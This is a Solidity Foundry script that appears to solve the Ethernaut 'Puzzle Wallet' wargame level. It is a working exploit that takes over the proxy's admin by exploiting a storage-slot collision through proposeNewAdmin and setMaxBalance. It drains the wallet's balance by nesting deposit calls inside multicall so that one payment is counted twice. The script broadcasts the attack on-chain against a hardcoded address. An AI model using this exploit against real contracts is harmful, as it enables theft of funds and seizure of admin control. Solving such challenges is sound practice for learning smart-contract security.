// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/24_Puzzle_Wallet.sol";

interface Target {
    function whitelisted(address _user) external view returns(bool);
    function maxBalance() external view returns(uint256);
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address _addr) external;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function deposit() external payable;
    function admin() external view returns(address);
    function multicall(bytes[] calldata data) external payable;
    function balances(address _addr) external view returns(uint256);
}

contract Helper {
    address public target_addr;
    bytes[] public payload_deposit;
    bytes[] public payload;

    constructor (address _target) {
        target_addr = _target;
    }

    function exploit() external {
        Target target = Target(target_addr);
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));

        uint256 target_bal = address(target).balance;
        payload_deposit.push(abi.encodeWithSignature("deposit()"));
        payload.push(abi.encodeWithSignature("deposit()"));
        payload.push(abi.encodeWithSignature("multicall(bytes[])", payload_deposit));
        payload.push(abi.encodeWithSignature("execute(address,uint256,bytes)", tx.origin, target_bal*2, ""));

        target.multicall{value: target_bal}(payload);

        target.setMaxBalance(uint256(uint160(tx.origin)));
    }

    receive() external payable { }

    fallback() external payable { }
}

contract POC is Script {
    Target public target;
    PuzzleWallet public wallet;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Target(0xcA8316fDc3562ffCe75F7667F65237Dce9fD59a9);
        Helper helper = new Helper(address(target));
        payable(address(helper)).transfer(address(target).balance);

        address admin = target.admin();
        console.log("before admin: ", admin);

        helper.exploit();
        
        admin = target.admin();
        console.log("after  admin: ", admin);
        
        vm.stopBroadcast();
    }
}